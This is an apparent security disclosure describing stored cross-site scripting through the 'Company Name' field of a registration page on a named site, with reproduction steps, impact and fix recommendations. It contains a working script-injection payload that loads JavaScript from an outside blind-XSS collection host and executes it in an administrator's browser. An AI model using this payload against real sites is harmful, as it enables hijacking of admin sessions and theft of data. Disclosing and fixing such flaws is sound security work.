## Title

Stored Cross-Site Scripting (XSS) via `Company Name` Field Leading to Admin Panel Execution

## Vulnerability Type

Stored XSS

## Summary

The `Company Name` field in the registration functionality allows arbitrary HTML/JavaScript input without proper sanitization before storing and rendering it inside the admin dashboard.

An attacker can inject malicious JavaScript during account registration, which later executes when an administrator views the registered users list.

## Vulnerable Endpoint

```http
https://kzlabs.com/63.php?view=register
```

## Vulnerable Parameter

```http
Company Name
```

## Steps to Reproduce

1. Navigate to the registration page:

```http
https://kzlabs.com/63.php?view=register
```

2. Fill in the registration form.

3. Insert the following payload into the `Company Name` field:

```html
'"><script src=https://xss.report/c/xicor></script>
```

4. Submit the registration form.

5. Wait for an administrator to access the admin dashboard/users panel.

6. Observe that the external JavaScript payload executes in the administrator’s browser context.

## Payload Used

```html
'"><script src=https://xss.report/c/xicor></script>
```

## Proof of Concept

The application stores arbitrary HTML/JavaScript from the `Company Name` field without sanitization and later renders it inside the admin dashboard.

As a result, attacker-controlled JavaScript executes when an administrator views the user listing page.

### Screenshot 1 — Malicious Payload Injected into Company Name Field

<img width="1920" height="1078" alt="image" src="https://github.com/user-attachments/assets/42783b9b-3546-4709-a137-8b730a638baa" />


### Screenshot 2 — Payload Rendered Inside Admin Dashboard

<img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/ef76a776-8e03-4a90-9741-2a50fdafe962" />

## Impact

An attacker can exploit this vulnerability to:

- Execute arbitrary JavaScript in the administrator’s browser
- Hijack administrator sessions
- Perform actions on behalf of administrators
- Exfiltrate sensitive administrative data
- Fully compromise administrative functionality

## Recommendations for Fix

- Properly sanitize and encode all user-controlled input before rendering
- Disallow dangerous HTML tags and JavaScript execution contexts
- Apply contextual output encoding
- Avoid rendering raw user input directly into administrative panels
- Implement a strict Content Security Policy (CSP)
